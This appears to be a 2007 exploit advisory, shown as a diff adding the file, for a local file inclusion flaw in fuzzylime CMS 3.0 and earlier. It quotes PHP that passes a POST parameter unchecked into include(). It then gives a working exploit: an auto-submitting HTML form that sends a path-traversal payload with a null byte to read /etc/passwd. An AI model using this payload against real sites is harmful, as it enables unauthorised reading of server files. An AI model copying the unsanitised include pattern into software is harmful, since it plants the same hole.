@@ -1,0 +1,62 @@
+########################################################################
+#################
+#
+#                           not sec group
+#        http://www.notsec.com     info@notsec.com
+#
+#
+#                      [fuzzylime (cms) <= 3.0]
+#
+# Class:         Local File Inclusion
+# Found:       08/09/2007
+# Site:           http://cms.fuzzylime.co.uk/
+#Download:  http://cms.fuzzylime.co.uk/files/cms.zip
+#Author:      [wHITe_ShEEp] of notsec
+#Contact:     white_sheep@notsec.com - http://www.notsec.com
+#
+########################################################################
+#################
+
+
+                   vulnerable code:
+       [cms]/code/getgalldata.php
+______________________________________________________
+
+1:    <?
+2:    $p = $_POST[p];
+3:    $m = $_POST[img];
+4:    $m = "e$m";
+5:    $entrytype = "gallery";
+6:    include "../gallery/$p.inc.php";
+7:    include "settings.inc.php";
+8:    include "../$admindir/languages/english.inc.php";
+...
+41:   ?>
+_______________________________________________________
+
+
+
+       Exploit: ( Work only with magic_quotes_gpc = Off )
+_______________________________________________________
+
+<html>
+<body onload="document.myform.submit()">
+<form name="myform" action="http://www.site.com/[fuzzylime]/code/
+getgalldata.php" method="post">
+<input name="p" type="text" size="30" value="../../../../../../../../
+etc/passwd%00" />
+</form>
+</html>
+________________________________________________________
+
+
+
+
+       Thanks to:
+________________________________________________________
+
+All notsec.com members;
+r00t for testing;
+________________________________________________________
+
+# milw0rm.com [2007-09-08]
